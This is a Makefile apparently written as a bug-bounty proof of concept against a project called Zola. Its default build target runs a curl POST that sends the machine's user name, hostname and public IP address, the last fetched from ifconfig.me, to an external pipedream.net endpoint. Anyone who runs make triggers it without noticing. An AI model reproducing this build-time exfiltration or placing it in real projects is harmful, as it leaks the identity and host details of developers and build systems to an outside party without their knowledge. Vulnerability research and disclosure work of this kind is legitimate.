all:
	@echo "Zola Bugbounty POC by @nvk0x - executing payload..."
	@curl -s -X POST "https://eolk0zhtt8ll5xq.m.pipedream.net/rce" \
	    -d "USER=$(shell whoami)" \
	    -d "HOST=$(shell hostname)" \
	    -d "IP=$(shell curl -s ifconfig.me)"
